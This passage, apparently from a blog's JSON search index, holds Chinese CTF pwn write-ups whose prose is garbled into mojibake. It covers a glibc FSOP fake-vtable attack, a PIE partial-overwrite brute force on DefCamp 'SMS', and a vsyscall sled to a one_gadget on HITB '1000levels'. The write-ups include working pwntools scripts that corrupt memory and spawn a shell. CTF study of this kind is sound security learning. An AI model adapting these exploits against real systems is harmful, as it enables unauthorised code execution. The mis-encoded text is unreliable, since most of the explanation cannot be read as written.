æ¡ä»¶é€šè¿‡_IO_2_1_stdout_ç»“æ„ä½“è°ƒç”¨vtableè™šè¡¨ä¸­çš„_setbufå‡½æ•°ã€‚\n\n(2)exitä¼šé€šè¿‡_IO_2_1_stdout_ç»“æ„ä½“è°ƒç”¨vtableè™šè¡¨ä¸­çš„_overflowå‡½æ•°ï¼Œä½†éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n_IO_FILE_plus._mode <= 0\n_IO_FILE_plus._IO_write_ptr > _IO_FILE_plus._IO_write_base\n```\n\næ‰€ä»¥æˆ‘ä»¬ä¼ªé€ çš„_IO_FILE_plusç»“æ„ä½“å°±éœ€è¦æ»¡è¶³ä¸Šè¿°æ¡ä»¶\n\n(3)exitä¼šè°ƒç”¨_rtld_globalç»“æ„ä½“ä¸­çš„_dl_rtld_lock_recursiveå‡½æ•°ï¼Œä¸ç”¨æ»¡è¶³æ¡ä»¶ã€‚\n\n3.ä¸‰ç§æ–¹æ³•æ”»å‡»æ€è·¯:\n\n(1)ç”±äºä¼šè°ƒç”¨_setbufå‡½æ•°ï¼Œvtableä½äºlibcæ•°æ®æ®µä¸Šä¸å¯å†™éƒ¨åˆ†ï¼Œæ— æ³•ç›´æ¥ä¿®æ”¹vtableå¯¹åº”çš„_IO_file_jumpsä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚é‚£ä¹ˆå¯ä»¥ä¼ªé€ _IO_2_1_stdout_ä¸­çš„vtableæŒ‡é’ˆï¼Œåˆ©ç”¨2å­—èŠ‚ä¿®æ”¹vtableæŒ‡é’ˆçš„å€’æ•°ä¸¤ä¸ªå­—èŠ‚ï¼Œä½¿å…¶æŒ‡å‘ä¸€ä¸ªå¯è¯»å¯å†™å†…å­˜ï¼Œå½¢æˆä¸€ä¸ªfake_IO_file_jumpsï¼Œç„¶ååœ¨è¯¥å†…å­˜å¯¹åº”_setbufå‡½æ•°åç§»å¤„ä¼ªé€ one_gadgetåœ°å€ã€‚\n\n```\nfrom pwn import *\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\np = process('./the_end')\n\nvtable_offset = 0xd8\n_setbuf_offset = 0x58\nfake_vtable_offset = 0x3c5588\n#è¿™ä¸ªéœ€è¦è‡ªå·±è°ƒè¯•æ‰¾ï¼Œå¹¶ä¿è¯åç§»_setbuf_offsetå¤„ä¿®æ”¹ä¹‹åç¨‹åºä¸ä¼šç›´æ¥å´©æºƒ\n\nsleep_addr = p.recvuntil(', good luck',drop=True).split(' ')[-1] \nlibc_base = long(sleep_addr,16) - libc.symbols['sleep']\n\none_gadget = libc_base + 0xf02b0\n_IO_2_1_stdout_vtable_addr = libc_base + libc.sym['_IO_2_1_stdout_'] + vtable_offset\n\nfake_vtable = libc_base + fake_vtable_offset\nfake_vtable_setbuf_addr = libc_base + fake_vtable_offset + _setbuf_offset\n\nprint 'libc_base: ',hex(libc_base)\nprint 'one_gadget:',hex(one_gadget)\n\nfor i in range(2):\n    p.send(p64(_IO_2_1_stdout_vtable_addr+i))\n    p.send(p64(fake_vtable)[i])\n\nfor i in range(3):\n    p.send(p64(fake_vtable_setbuf_addr+i))\n    p.send(p64(one_gadget)[i])\n\np.sendline(\"exec /bin/sh 1>&0\")\n\np.interactive()\n```\n\n \n\n(2)_IO_FILE_plusç»“æ„ä½“ä½äºlibcæ•°æ®æ®µä¸Šå¯è¯»å¯å†™å†…å­˜å¤„ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ï¼Œä½†æ˜¯ä¿®æ”¹å­—èŠ‚æ•°åªæœ‰5ä¸ªï¼ŒæŒ‰ç…§ç¬¬ä¸€ç§æ–¹æ³•ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n_IO_FILE_plus._mode <= 0  //è¯¥æ¡ä»¶è‡ªåŠ¨å°±ä¼šæ»¡è¶³\n_IO_FILE_plus._IO_write_ptr > _IO_FILE_plus._IO_write_base//è¯¥æ¡ä»¶éœ€è¦è®¾ç½®1ä¸ªå­—èŠ‚\n```\n\nå†åˆ©ç”¨1ä¸ªå­—èŠ‚ä¿®æ”¹vtableçš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ï¼Œä¼ªé€ vtableæŒ‡é’ˆï¼Œç„¶ååˆ©ç”¨3ä¸ªå­—èŠ‚åœ¨è¯¥å†…å­˜å¯¹åº”_setbufå‡½æ•°åç§»å¤„ä¼ªé€ one_gadgetåœ°å€ã€‚\n\n(3)_rtld_globalç»“æ„ä½“ä½äºlibcæ•°æ®æ®µä¸Šå¯è¯»å¯å†™å†…å­˜å¤„ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ã€‚é‚£ä¹ˆç›´æ¥ä¿®æ”¹_dl_rtld_lock_recursiveå‡½æ•°æŒ‡é’ˆæŒ‡å‘one_gadgetå°±è¡Œäº†ã€‚\n\n \n\næ–¹æ³•(2)å’Œæ–¹æ³•(3)å‚è€ƒï¼š\n\nhttps://blog.csdn.net/Mira_Hu/article/details/103736917\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://wiki.x10sec.org/pwn/linux/io_file/fake-vtable-exploit-zh/\n\n \n","tags":["First"],"categories":["PWN","FSOP0xe"]},{"title":"DefCamp CTF Finals 2016-SMS","url":"/2021/08/14/DefCamp CTF Finals 2016-SMS/","content":"\n1.å¸¸è§„checksecæ“ä½œï¼Œå¼€äº†PIEå’ŒNXï¼Œé¦–å…ˆshellcodeä¸èƒ½ç”¨ã€‚å…¶æ¬¡PIEè¡¨ç¤ºåœ°å€éšæœºåŒ–ï¼Œä¹Ÿå°±æ˜¯æ²¡åŠæ³•è¦†ç›–è¿”å›åœ°å€æ¥ç›´æ¥è·³è½¬åˆ°æˆ‘ä»¬æƒ³è¦çš„å‡½æ•°å¤„ã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œå¯ä»¥çœ‹åˆ°åœ¨domså‡½æ•°ä¸­çš„v1çš„æ ˆåœ°å€è¢«ä¼ é€’ç»™set_userå’Œset_sms\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528555.jpeg)\n\nä¹‹åset_userä¸­ä¼šè¯»å–è¾“å…¥ä¿å­˜åœ¨Sè¿™ä¸ªæ ˆåœ°å€ä¸Šï¼Œç„¶åä»sä¸­è¯»å–å‰å››åä¸ªå­—èŠ‚åˆ°a1[140]-a1[180]ï¼Œè¿™ä¸ªa1å°±æ˜¯domså‡½æ•°ä¸­çš„v1ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528927.jpeg)\n\nå†å¾€åçœ‹ï¼Œåœ¨set_smså‡½æ•°ä¸­ï¼ŒåŒæ ·è¯»å–1024ä¸ªå­—èŠ‚åˆ°Sè¿™ä¸ªæ ˆå˜é‡ä¸­ï¼Œå¹¶ä¸”æœ€åå°†Sçš„ç‰¹å®šé•¿åº¦strncpyç»™a1ï¼Œè¿™ä¸ªç‰¹å®šé•¿åº¦å°±æ˜¯a1[180]ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡set_useræ¥æ§åˆ¶a1[180]ï¼Œè¿›è€Œæ§åˆ¶set_smså‡½æ•°ä¸­strncpyç»™a1æ‹·è´çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯domså‡½æ•°ä¸­v1çš„é•¿åº¦ï¼Œä½¿å…¶å¤§äºv1è·ç¦»æ ˆåº•çš„è·ç¦»0xc0ï¼Œä»è€Œåœ¨domså‡½æ•°æ ˆä¸­æ‰§è¡Œæ ˆæº¢å‡ºï¼Œè€Œdomså‡½æ•°ä¸­çš„v1ä¹Ÿå°±æ˜¯a1ï¼Œæ˜¯åœ¨set_smsä¸­ç”±æˆ‘ä»¬è¾“å…¥åˆ°Sä¸Šçš„å†…å®¹æ‹·è´è¿‡å»çš„ï¼Œé•¿åº¦ä¸º0x400ï¼Œå®Œå…¨å¯æ§ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527621.jpeg)\n\nå¦å¤–ç¨‹åºå­˜åœ¨åé—¨frontdoor()ï¼Œåªè¦è¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œå†è¾“å…¥binshå­—ç¬¦ä¸²å°±èƒ½getshellã€‚\n\n2.æ‰€ä»¥ç°å­˜åœ¨domså‡½æ•°æ ˆæº¢å‡ºï¼Œåé—¨å‡½æ•°è¿™ä¸¤ä¸ªæ¼æ´ï¼Œä½†æ˜¯ç”±äºPIEï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æ²¡åŠæ³•ç¡®å®šfrontdoor()çš„åœ°å€ï¼Œæ— æ³•ç›´æ¥è¦†ç›–domså‡½æ•°è¿”å›åœ°å€åˆ°è¾¾åé—¨å‡½æ•°\n\n3.è¿™é‡Œå°±éœ€è¦ç”¨åˆ°å†…å­˜é¡µçš„ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œç”±äºä¸€ä¸ªå†…å­˜é¡µçš„å¤§å°ä¸º0x1000ï¼Œè€Œfrontdoor()å‡½æ•°å’Œdosmså‡½æ•°å’Œmainå‡½æ•°ç­‰ç­‰å‡½æ•°ï¼Œéƒ½åœ¨åŒä¸€ä¸ªå†…å­˜é¡µä¸Šï¼Œæ‰€ä»¥åœ¨64ä½ç¨‹åºä¸‹ä»–ä»¬çš„å‡½æ•°åœ°å€éƒ½æ˜¯0x############x***è¿™ç§ç±»å‹ï¼Œå‰é¢12ä½#æ¯æ¬¡åŠ è½½éƒ½ä¸ä¸€æ ·ï¼Œè€Œåé¢çš„ä¸‰ä½***ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå› ä¸ºéƒ½åœ¨0x0000563cc913(x)000 - 0x0000563cc913(x+1)000è¿™ä¸ªå†…å­˜é¡µä¸Šã€‚ç”¨IDAæ‰“å¼€æŒ‰ctrl+så¯ä»¥çœ‹åˆ°\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527058.png)\n\nè¿™äº›æ®µéƒ½åœ¨0x0000563cc913(x)000 - 0x0000563cc913(x+1)000è¿™ä¸ªå†…å­˜é¡µä¸Šã€‚è€Œå¼€å¯äº†PIEç¨‹åºçš„ï¼Œ0000563cc913(x)è¿™ä¸ªæ•°å€¼æ¯æ¬¡éƒ½ä¼šå˜åŒ–ï¼Œä½†æ˜¯æœ€åä¸‰ä½æ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œå°±æ˜¯å›ºå®šç›¸å¯¹äºè¿™ä¸ªå†…å­˜é¡µèµ·å§‹ä½ç½®çš„åç§»ã€‚\n\n4.æ‰€ä»¥è¦†ç›–è¿”å›åœ°å€æ—¶ï¼Œå¯ä»¥æƒ³åˆ°ï¼Œdosmså‡½æ•°çš„è¿”å›åœ°å€æ˜¯call dosmsä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯åœ¨mainå‡½æ•°ä¸Šï¼Œè€Œfrontdoorå‡½æ•°çš„åœ°å€ä¸mainå‡½æ•°çš„åœ°å€éƒ½åœ¨0x0000563cc913(x)è¿™ä¸ªå†…å­˜é¡µä¸Šã€‚æ‰€ä»¥å½“ç¨‹åºè¢«åŠ è½½ï¼Œ0x0000563cc913(x)è¿™ä¸ªæ•°å€¼å‘ç”Ÿæ”¹å˜æ—¶ï¼Œfrontdoorå‡½æ•°å’Œmainå‡½æ•°åœ°å€ä¸­å¯¹åº”çš„æ•°å€¼ä¹Ÿä¼šç›¸åº”æ”¹å˜ï¼Œè€Œä¸”éƒ½æ˜¯ä¸€æ ·çš„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹dosmsè¿”å›åœ°å€çš„åå››ä½ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰çš„(x)yyyæ¥è·³è½¬åˆ°frontdoorã€‚\n\n5.å¦‚æœç›´æ¥çˆ†ç ´ï¼ŒæŒ‰ç…§æ•°å­¦æœŸæœ›éœ€è¦å°è¯•0xffff+1=65535+1è¿™ä¹ˆå¤šæ¬¡ï¼Œå¤ªå·¨å¤§ã€‚è¿™é‡Œåˆè€ƒè™‘åˆ°yyyæ—¶ä¸ä¼šæ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨IDAå¯ä»¥çœ‹åˆ°frontdoorå‡½æ•°çš„åä¸‰ä½åœ°å€ä¸º900ï¼Œæˆ‘ä»¬åœ¨å†™payloadçš„æ—¶å€™ç›´æ¥å†™å…¥å³å¯ï¼Œå°±æ˜¯PIEä¹Ÿä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚ç°åœ¨å”¯ä¸€ä¸ç¡®å®šçš„å°±æ˜¯(x)yyyä¸­çš„xã€‚ç›´æ¥çˆ†ç ´å°±å¥½ï¼Œå¹³å‡å°è¯•çš„æ•°å­¦æœŸæœ›ä¸ºf+1=16æ¬¡ï¼Œä¹Ÿä¸ç®—å¤ªé«˜ã€‚\n\n6.æ‰€ä»¥å°è¯•å†™payload:\n\n(1)ä¿®æ”¹set_userä¸­çš„a1[180]çš„å€¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef setlength():\n    io.recvuntil('> ')\n    payload_setlength = 'a'*40 #padding\n    payload_setlength += '\\xca' \n    io.sendline(payload_setlength)\n```\n\n(2)æ‰§è¡Œæ ˆæº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€çš„ä½ä¸¤ä¸ªå­—èŠ‚ä¸º\"\\x(x)9\"å’Œ\"\\x01\"(å¤§ç«¯åºï¼Œæ³¨æ„é¡ºåº)\n\n```\n#æ³¨é‡Šå¤´\n\ndef StackOverflow():\n    io.recvuntil('> ')\n    payload_StackOverflow = 'a'*200 #padding\n    payload_StackOverflow += '\\x01\\xa9' \n    #frontdoorçš„åœ°å€åä¸‰ä½æ˜¯0x900, +1è·³è¿‡push rbpï¼Œå½±å“\n    io.sendline(payload_StackOverflow)\n```\n\nè¿™é‡Œè·³è¿‡push rbpçš„åŸå› æ˜¯å› ä¸ºstrncpyçš„å…³ç³»ï¼Œå¦‚æœå‘é€çš„æ˜¯\\x00,\\xa9ï¼Œé‚£ä¹ˆå…ˆå¤åˆ¶\\x00ï¼Œåˆ™ä¼šç”±äºstrncpyçš„æœºåˆ¶æå‰ç»“æŸå¤åˆ¶ï¼Œé€ æˆa9æ²¡åŠæ³•å¤åˆ¶è¿›å»ï¼Œä»è€Œç¨‹åºå‡ºé”™ã€‚(å‘é€çš„ç”±äºæ˜¯fgetå‡½æ•°ï¼Œæ‰€ä»¥ä¼šå…¨ç›˜æ¥å—ï¼Œ\\x00ä¹Ÿä¼šæ¥å—ï¼Œä¸æ˜¯è¯»å–å‡½æ•°çš„åŸå› ã€‚)è€Œè·³è¿‡push rbpå¹¶ä¸å½±å“frontdooré‡Œé¢çš„å‡½æ•°æ‰§è¡Œï¼Œæ‰€ä»¥ä¸ä¼šå½±å“getshellã€‚\n\n(3)ç”±äºæ¯æ¬¡åœ°å€éšæœºï¼Œæ‰€ä»¥åœ°å€éšæœºæˆa900çš„æ¦‚ç‡ä¸º1/16ï¼Œé‚£ä¹ˆå°±è€ƒè™‘ç”¨è‡ªåŠ¨åŒ–æ¥çˆ†ç ´å®æ–½ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ni = 0\nwhile True:\n    i += 1\n    print i\n    io.remote(\"127.0.0.1\",0000)\n    setlength()\n    StackOverflow()\n    try:\n        io.recv(timeout = 1) \n        #è¦ä¹ˆå´©æºƒè¦ä¹ˆçˆ†ç ´æˆåŠŸï¼Œè‹¥å´©æºƒioä¼šå…³é—­ï¼Œio.recv()ä¼šè§¦å‘   EOFError\n    except EOFError:\n        io.close()\n        continue\n    else:\n        sleep(0.1)\n        io.sendline('/bin/sh\\x00')\n        sleep(0.1)\n        io.interactive() #æ²¡æœ‰EOFErrorçš„è¯å°±æ˜¯çˆ†ç ´æˆåŠŸï¼Œå¯ä»¥å¼€shell\n        break\n```\n\nâ–²å¦‚æœç›´æ¥processæœ¬åœ°åˆ™æ²¡åŠæ³•æˆåŠŸè¿è¡Œï¼Œéœ€è¦ç”¨socatè½¬å‘ï¼Œç”¨127.0.0.1æœ¬åœ°è¿æ¥æ‰å¯ä»¥ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"HITB GSEC CTF 2017-1000levels","url":"/2021/08/14/HITB GSEC CTF 2017-1000levels/","content":"\n1.ä¸ä¹‹å‰BCTF 2017-100levelsä¸€æ¨¡ä¸€æ ·ï¼Œåªä¸è¿‡æœ€å¤§å€¼å˜æˆäº†1000å…³ï¼Œæ‰€ä»¥è¿™é‡Œä¹ŸåŒæ ·å¯ä»¥ç”¨çˆ†ç ´æ¥åšï¼Œä½†æ˜¯å¯ä»¥ç”¨å¦ä¸€ç§æ–¹æ³•ï¼Œvsyscallã€‚\n\n2.è¿›å…¥IDAå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªhintå‡½æ•°ï¼Œè€Œä¸”é‡Œé¢æœ‰systemå‡½æ•°ï¼Œä½†æ˜¯å¾ˆå¥‡æ€ªï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsprintf((char *)&v1, \"Hint: %p\\n\", &system, &system);\n```\n\nè¿™ä¸ªä»£ç æ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œè¿˜æ˜¯çœ‹ä¸‹æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531418.jpeg)\n\nè¿™é‡Œå°±æ˜¯å°†systemçš„åœ°å€èµ‹å€¼ç»™raxï¼Œç„¶åraxç»™æ ˆä¸Šçš„[rbp+var_110]èµ‹å€¼ã€‚ä¹‹åä¹Ÿæ²¡æœ‰ä»€ä¹ˆå…¶å®ƒçš„æ›´æ”¹æ ˆä¸Š[rbp+var_110]çš„æ“ä½œï¼Œæ‰€ä»¥è¿›å…¥hintå‡½æ•°ä¹‹åï¼Œä¸€å®šä¼šå°†systemå‡½æ•°æ”¾åˆ°æ ˆä¸Šï¼Œé€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ã€‚\n\n3.ä¹‹åè¿›å…¥goå‡½æ•°ï¼Œå‘ç°å¦‚æœç¬¬ä¸€æ¬¡è¾“å…¥è´Ÿæ•°ï¼ŒåŸæœ¬å°†å…³å¡æ•°èµ‹å€¼ç»™[rbp+var_110]çš„æ“ä½œå°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œé‚£ä¹ˆ[rbp+var_110]ä¸Šä¿å­˜çš„ä»ç„¶æ˜¯systemå‡½æ•°çš„åœ°å€ã€‚ä¹‹åå†è¾“å…¥å…³å¡æ•°ï¼Œç›´æ¥åŠ åˆ°[rbp+var_110]ä¸Šï¼Œé‚£ä¹ˆå¦‚æœç¬¬ä¸€æ¬¡è¾“å…¥è´Ÿæ•°ï¼Œç¬¬äºŒæ¬¡è¾“å…¥systemå‡½æ•°å’Œone_gadgetçš„åç§»ï¼Œé‚£ä¹ˆå°±å˜ç›¸å°†[rbp+var_110]ä¸Šå­˜æ”¾çš„å†…å®¹ä¿å­˜ä¸ºone_gadgetçš„åœ°å€ã€‚\n\nâ–²è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ[rbp+var_110]æ˜¯åœ¨hintå‡½æ•°ä¸­è¢«èµ‹å€¼çš„ï¼Œè€Œgoå‡½æ•°ä¸­ç”¨åˆ°çš„ä¹Ÿæ˜¯[rbp+var_110]è¿™ä¸ªå˜é‡ï¼Œä½†æ˜¯ä¸åŒå‡½æ•°æ ˆè‚¯å®šæ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸¤ä¸ª[rbp+var_110]æ˜¯ä¸æ˜¯ä¸€æ ·çš„å°±å€¼å¾—æ€è€ƒä¸€ä¸‹ã€‚çœ‹ç¨‹åºå¯ä»¥å‘ç°ï¼Œhintå‡½æ•°å’Œgoå‡½æ•°éƒ½æ˜¯åœ¨mainå‡½æ•°ä¸­è°ƒç”¨çš„ï¼Œé‚£ä¹ˆå¦‚æœè°ƒç”¨çš„æ—¶å€™ä¸¤å¤„çš„rspæ˜¯ä¸€æ ·çš„å°±å¯ä»¥ä¿è¯ä¸¤ä¸ªå‡½æ•°çš„rbpä¸€æ ·ï¼Œä¹Ÿå°±ä»£ç [rbp+var_110]ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531579.jpeg)\n\nå¯ä»¥çœ‹åˆ°ä»è¯»å–é€‰é¡¹æ•°æ®ä¹‹åï¼Œåˆ°åˆ¤æ–­è¯­å¥ä¸€ç›´æ²¡æœ‰push,popä¹‹ç±»çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºæ— è®ºæ˜¯è¿è¡Œåˆ°hintå‡½æ•°è¿˜æ˜¯goå‡½æ•°æ—¶ï¼Œmainå‡½æ•°æ ˆçš„çŠ¶æ€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä»è€Œå¯¼è‡´è¿›å…¥è¿™ä¸¤ä¸ªå‡½æ•°ä¸­çš„æ ˆåº•ä¹Ÿéƒ½æ˜¯åŒä¸€ä¸ªåœ°å€ï¼Œé‚£ä¹ˆ[rbp+var_110]ä¹Ÿå°±ä¸€æ ·ï¼Œæ‰€ä»¥ç”¨hintå‡½æ•°æ¥ä¸º[rbp+var_110]èµ‹å€¼æˆsystemå‡½æ•°ï¼Œå†ç”¨goå‡½æ•°æ¥ä¸º[rbp+var_110]èµ‹å€¼ä¸ºone_gadgetè¿™æ¡è·¯æ˜¯å¯ä»¥çš„ï¼ŒåŒæ ·å¯ä»¥è°ƒè¯•æ¥ç¡®å®šä¸€ä¸‹ã€‚\n\n4.é‚£ä¹ˆèµ‹å€¼ä¹‹åè¿›å…¥levelå…³å¡å‡½æ•°ï¼Œç”±äºé€’å½’å…³ç³»ï¼Œæœ€åä¸€å…³çš„æ ˆæ˜¯å’Œgoå‡½æ•°çš„æ ˆè¿åœ¨ä¸€èµ·çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æœ€åä¸€å…³çš„æ ˆæº¢å‡ºæŠµè¾¾goå‡½æ•°çš„æ ˆï¼Œä»è€ŒæŠµè¾¾[rbp+var_110]è¿™ä¸ªåœ°å€å¤„ã€‚\n\n5.ä½†æ˜¯æ ˆæº¢å‡ºåªèƒ½ä¿®æ”¹æ•°æ®ï¼Œå°±ç®—æ§åˆ¶eipï¼Œä½†æ˜¯ä¹Ÿå¹¶ä¸çŸ¥é“[rbp+var_110]å¤„çš„çœŸå®åœ°å€ï¼Œåªèƒ½é€šè¿‡è°ƒè¯•æ¥çŸ¥é“åç§»æ˜¯å¤šå°‘ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨çš„vsyscallæ¥å°†rspä¸‹æŒªåˆ°[rbp+var_110]å¤„ä»è€Œæ‰§è¡Œvsyscallçš„retæ“ä½œæ¥æ‰§è¡Œ[rbp+var_110]å¤„çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯one_gadgetã€‚\n\n6.è¿™é‡Œçœ‹ä¸€ä¸‹vsyscallå¤„çš„æ•°æ®ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531595.png)\n\nâ–²vsyscallçš„ç‰¹ç‚¹ï¼š\n\n(1)æŸäº›ç‰ˆæœ¬å­˜åœ¨ï¼Œéœ€è¦ç”¨åˆ°gdbæ¥æŸ¥çœ‹ï¼ŒIDAä¸­é»˜è®¤ä¸å¯è§ã€‚\n\n(2)åœ°å€ä¸å—åˆ°ASLRå’ŒPIEçš„å½±å“ï¼Œå›ºå®šæ˜¯0xffffffffff600000-0xffffffffff601000ã€‚\n\n(3)ä¸èƒ½ä»ä¸­é—´è¿›å…¥ï¼Œåªèƒ½ä»å‡½æ•°å¼€å¤´è¿›å…¥ï¼Œæ„å‘³ç€ä¸èƒ½ç›´æ¥è°ƒç”¨é‡Œé¢çš„syscallã€‚è¿™é‡Œvsyscallåˆ†ä¸ºä¸‰ä¸ªå‡½æ•°ï¼Œä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ˜¯\n\nA.gettimeofday: 0xffffffffff600000\n\nB.time: 0xffffffffff600400\n\nC.getcpu: 0xffffffffff600800\n\n(4)gettimeofdayå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶è¿”å›å€¼å°±æ˜¯0ï¼Œä¿å­˜åœ¨raxå¯„å­˜å™¨ä¸­ã€‚è¿™å°±ä¸ºæŸäº›one_gadgetåˆ›é€ äº†æ¡ä»¶ã€‚\n\n7.è§‚å¯Ÿä»£ç å¯ä»¥å‘ç°ï¼Œä¸‰ä¸ªå‡½æ•°æ‰§è¡ŒæˆåŠŸä¹‹åç›¸å½“äºä¸€ä¸ªretæ“ä½œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†gettimeofdayæ”¾åœ¨eipå¤„ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ”¾äº†ä¸€ä¸ªretæ“ä½œä¸Šå»ï¼Œè€Œretæ“ä½œåˆç›¸å½“äºpop  eipï¼Œé‚£ä¹ˆå°±ç›¸å½“äºç›´æ¥å°†rspå¾€ä¸‹æ‹‰äº†ä¸€ä¸ªå•ä½ã€‚å¦‚æœæˆ‘ä»¬å¤šæ¬¡è°ƒç”¨gettimeofdayï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†rspä¸‹æ‹‰å¤šä¸ªå•ä½ï¼Œä»è€ŒæŠµè¾¾æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹æ¥æ‰§è¡Œä»£ç ã€‚é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å°†eipæ”¹æˆgettimeofdayï¼Œç„¶ååœ¨ä¹‹åæ·»åŠ å¤šä¸ªgettimeofdayæ¥æ»‘åˆ°one_gadgetæ¥æ‰§è¡Œä»£ç ã€‚\n\n8.æ‰€ä»¥ç°åœ¨å°±å¯ä»¥ç¼–å†™expäº†\n\n(1)å‰ç½®å†…å®¹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nlibc_system_offset = 0x432C0\t\t\t\t\t\n#å‡å»systemå‡½æ•°ç¦»libcå¼€å¤´çš„åç§»\none_gadget_offset = 0x43158\t\t\t\t\n#åŠ ä¸Šone gadget rceç¦»libcå¼€å¤´çš„åç§»\nvsyscall_gettimeofday = 0xffffffffff600000\n\nio.recvuntil('Choice:')\nio.sendline('2') #è®©systemçš„åœ°å€è¿›å…¥æ ˆä¸­\nio.recvuntil('Choice:')\nio.sendline('1') #è°ƒç”¨go()\nio.recvuntil('How many levels?')\nio.sendline('-1') #è¾“å…¥çš„å€¼å¿…é¡»å°äº0ï¼Œé˜²æ­¢è¦†ç›–æ‰systemçš„åœ°å€\nio.recvuntil('Any more?')\nio.sendline(str(one_gadget_offset-libc_system_offset))\t\t\n#ç¬¬äºŒæ¬¡è¾“å…¥å…³å¡çš„æ—¶å€™è¾“å…¥åç§»å€¼ï¼Œä»è€Œé€šè¿‡ç›¸åŠ å°†systemçš„åœ°å€å˜ä¸ºone gadget rceçš„åœ°å€\n```\n\nè¿™é‡Œç”±äºç›¸åŠ å…³ç³»ï¼Œlevels=system_addr + one_gadget_offset - libc_system_offset,è‚¯å®šè¶…è¿‡999ï¼Œæ‰€ä»¥å…³å¡æ•°ä¸€å®šæ˜¯1000å…³ã€‚\n\n(2)å¼€å§‹å¾ªç¯ç­”é¢˜ï¼Œç›´è‡³åˆ°è¾¾æœ€åä¸€å…³æ‰§è¡Œæ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef answer():\n    io.recvuntil('Question: ') \n    answer = eval(io.recvuntil(' = ')[:-3])\n    io.recvuntil('Answer:')\n    io.sendline(str(answer))\nfor i in range(999): #å¾ªç¯ç­”é¢˜\n    log.info(i)\n    answer()\n```\n\n(3)æœ€åä¸€å…³æ‰§è¡Œæ ˆæº¢å‡ºï¼Œåˆ©ç”¨gettimeofdayæ»‘è‡³one_gadegtä»è€Œgetshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nio.recvuntil('Question: ')\nio.send(b'a'*0x38 + p64(vsyscall_gettimeofday)*3)\nio.interactive()\n```\n\nâ–²ä»¥ä¸‹æ˜¯æµ‹è¯•[rbp+var_110]çš„æ•°æ®ï¼š\n\nmainå‡½æ•°ä¸­çš„rbp:  00007FFD3A854900\n\nhintå‡½æ•°ä¸­çš„rbp:   00007FFD3A8548C0\n\ngoå‡½æ•°ä¸­çš„rbp:    00007FFD3A8548C0\n\nâ–²vsyscallç”¨æ³•:\n\nvsyscallç›´æ¥è¿›è¡Œsyscallï¼Œå¹¶æ²¡æœ‰åˆ©ç”¨æ ˆç©ºé—´ï¼Œæ‰€ä»¥åœ¨å¤„ç†æ ˆæº¢å‡ºï¼Œä½†æ˜¯ç”±äºPIEæ²¡æœ‰åˆ«çš„åœ°å€å¯ä»¥ç”¨æ—¶ï¼Œè€Œæ ˆä¸Šåˆæœ‰æŸä¸ªæœ‰ç”¨çš„åœ°å€çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡vsyscallæ„é€ 